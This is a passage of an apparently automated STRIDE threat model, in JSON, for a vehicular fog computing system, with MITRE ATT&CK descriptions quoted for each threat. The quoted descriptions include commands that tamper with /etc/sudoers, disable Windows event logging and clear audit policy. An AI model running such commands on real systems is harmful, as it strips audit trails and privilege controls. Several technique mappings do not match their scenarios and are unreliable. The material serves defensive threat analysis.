                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on fog nodes to gain unauthorized access and control.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have unpatched vulnerabilities allowing privilege escalation.",
                    "Role": "Attacker",
                    "Condition": "Presence of exploitable vulnerabilities in fog node software."
                },
                {
                    "Assumption": "Access controls and monitoring are insufficient to detect and prevent escalation attempts.",
                    "Role": "VFC System",
                    "Condition": "Weak access control and monitoring systems."
                }
            ],
            "Potential Impact": "Unauthorized access and control over fog nodes, enabling data manipulation and disruption of services.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "fog node",
                "unauthorized access",
                "control"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to cloud services through a compromised account.",
            "Assumptions": [
                {
                    "Assumption": "Cloud accounts are not secured with strong authentication practices.",
                    "Role": "Cloud Administrator",
                    "Condition": "Weak password policies and absence of multi-factor authentication."
                },
                {
                    "Assumption": "Compromised account was not promptly detected.",
                    "Role": "VFC System",
                    "Condition": "Lack of real-time monitoring and alerting on account activities."
                }
            ],
            "Potential Impact": "Full administrative control over cloud services, leading to data breaches, tampering, and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "cloud services",
                "compromised account",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a vulnerability to gain root access on an RSU, compromising its operations.",
            "Assumptions": [
                {
                    "Assumption": "RSUs contain unpatched software vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Presence of known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The system lacks robust monitoring and alerting for unusual activities on RSUs.",
                    "Role": "VFC System",
                    "Condition": "Insufficient anomaly detection mechanisms and incident response."
                }
            ],
            "Potential Impact": "Compromised RSU leading to disruption in traffic management and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "RSU",
                "root access",
                "compromise"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a fog node to communicate with smart vehicles and collect sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the roadside unit (RSU)",
                    "Role": "Attacker",
                    "Condition": "The RSU is not secured adequately"
                },
                {
                    "Assumption": "There is a lack of robust authentication mechanisms between fog nodes and vehicles",
                    "Role": "System Designer",
                    "Condition": "No authentication is enforced"
                },
                {
                    "Assumption": "Vehicles would rely on fog nodes for data and instructions without verification",
                    "Role": "Vehicle System",
                    "Condition": "Vehicles prioritize low-latency data processing"
                }
            ],
            "Potential Impact": "Data confidentiality breach and unauthorized data collection by attacker.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "man-in-the-middle",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a vehicle's identity to the fog node to send malicious or misleading data.",
            "Assumptions": [
                {
                    "Assumption": "No mutual authentication is in place between fog nodes and vehicles",
                    "Role": "System Designer",
                    "Condition": "Mutual authentication mechanisms are not implemented"
                },
                {
                    "Assumption": "Fog nodes assume received data is from legitimate vehicles",
                    "Role": "Fog Node",
                    "Condition": "Insufficient data validation processes"
                },
                {
                    "Assumption": "Attacker has the means to intercept and modify wireless communications",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to the communication pathways"
                }
            ],
            "Potential Impact": "Corruption of data and denial of service due to erroneous processing decisions by fog nodes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "data injection",
                "misinformation"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofing cloud services to hijack data flows between fog nodes and centralized servers.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not verify the authenticity of the cloud service endpoint",
                    "Role": "Fog Node",
                    "Condition": "Lack of endpoint validation processes"
                },
                {
                    "Assumption": "The attacker has access to the network communication path between fog nodes and cloud services",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities exist"
                },
                {
                    "Assumption": "Fog nodes handle sensitive data that could be intercepted if blinded by the spoof",
                    "Role": "Fog Node",
                    "Condition": "High data sensitivity"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information and interception of critical data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "cloud",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the data generated by smart vehicles before it reaches the fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The network communication between vehicles and fog nodes is not encrypted",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption protocols"
                },
                {
                    "Assumption": "An attacker can intercept and inject data into the communication stream",
                    "Role": "Attacker",
                    "Condition": "Access to communication stream"
                },
                {
                    "Assumption": "Vehicles do not verify the integrity of data before transmission",
                    "Role": "Vehicle",
                    "Condition": "Insufficient data integrity checks"
                }
            ],
            "Potential Impact": "Integrity and accuracy of data are compromised, leading to incorrect processing and decision-making.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "communication interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infects fog nodes, altering stored and transmitted data to the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have robust anti-malware defenses",
                    "Role": "System Designer",
                    "Condition": "Absence of strong anti-malware solutions"
                },
                {
                    "Assumption": "Malware can be introduced through compromised updates or physical access",
                    "Role": "Attacker",
                    "Condition": "Lack of secure update mechanisms or physical security"
                },
                {
                    "Assumption": "Fog nodes process and store critical data locally before forwarding to the cloud",
                    "Role": "Fog Node",
                    "Condition": "Local data processing requirement"
                }
            ],
            "Potential Impact": "Data corruption and loss of integrity, leading to widespread disruption in system operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "data corruption",
                "local processing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of RSUs to alter data collected from vehicles and other sensors.",
            "Assumptions": [
                {
                    "Assumption": "RSUs firmware is not securely updated or validated",
                    "Role": "System Designer",
                    "Condition": "Absence of secure update mechanisms"
                },
                {
                    "Assumption": "The attacker can access RSUs physically or remotely to perform updates",
                    "Role": "Attacker",
                    "Condition": "Lack of physical and network security"
                },
                {
                    "Assumption": "RSUs perform critical real-time traffic management functions",
                    "Role": "RSU",
                    "Condition": "Time-sensitive operations"
                }
            ],
            "Potential Impact": "Compromised data integrity and real-time processing, leading to potential traffic mismanagement and hazards.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware manipulation",
                "RSU",
                "real-time processing"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may deploy rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting and modifying operating-system API calls that supply system information. Rootkits or rootkit-enabling functionality may reside at the user or kernel level in the operating system, or lower. (Citation: Enterprise ATT&CK January 2018)   \n\nFirmware rootkits that affect the operating system yield nearly full control of the system. While firmware rootkits are normally developed for the main processing board, they can also be developed for the I/O that is attached to an asset. Compromise of this firmware allows the modification of all of the process variables and functions the module engages in. This may result in commands being disregarded and false information being fed to the main device. By tampering with device processes, an adversary may inhibit its expected response functions and possibly enable [Impact](https://attack.mitre.org/tactics/TA0105).",
                "id": "attack-pattern--3b6b9246-43f8-4c69-ad7a-2b11cfe0a0d9",
                "technique_id": "T0851"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses compromised credentials to generate false data logs at the fog node level.",
            "Assumptions": [
                {
                    "Assumption": "Credential management and logging systems are not secure",
                    "Role": "System Designer",
                    "Condition": "Undersecured credential and logging systems"
                },
                {
                    "Assumption": "Attackers have access to credentials due to poor security practices",
                    "Role": "Attacker",
                    "Condition": "Credential access"
                },
                {
                    "Assumption": "Fog nodes do not have non-repudiation mechanisms in place",
                    "Role": "Fog Node",
                    "Condition": "No non-repudiation mechanisms"
                }
            ],
            "Potential Impact": "Disruption in accountability and potential legal/operational consequences.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "credential compromise",
                "data logs",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Vehicle owners deny actions performed by their vehicles due to lack of audit trails.",
            "Assumptions": [
                {
                    "Assumption": "No audit trails are maintained for actions performed by vehicles",
                    "Role": "System Designer",
                    "Condition": "Lack of audit trail protocols"
                },
                {
                    "Assumption": "Users can access and alter logs stored on their vehicles",
                    "Role": "Vehicle Owner",
                    "Condition": "Log access"
                },
                {
                    "Assumption": "Vehicles generate vast amounts of unverified data",
                    "Role": "Vehicle",
                    "Condition": "Unverified data generation"
                }
            ],
            "Potential Impact": "Reduction in accountability and potential for fraudulent claims.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trail",
                "vehicle logs",
                "fraud"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Fog nodes wrongly deny sending alerts or processing data due to insufficient logging.",
            "Assumptions": [
                {
                    "Assumption": "Limited or no logging mechanisms on fog nodes",
                    "Role": "System Designer",
                    "Condition": "Underdeveloped logging systems"
                },
                {
                    "Assumption": "Critical system events are not recorded or monitored effectively",
                    "Role": "Fog Node",
                    "Condition": "Critical event management"
                },
                {
                    "Assumption": "Fog nodes handle high volumes of data making logs less prioritized",
                    "Role": "Fog Node",
                    "Condition": "High data volume operations"
                }
            ],
            "Potential Impact": "Loss of accountability and inability to trace back actions or events.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "alert management",
                "data processing"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of unencrypted data during Edge-Fog or Fog-Cloud data flows.",
            "Assumptions": [
                {
                    "Assumption": "Data flows are not encrypted",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "Attacker has access to the communication channels",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
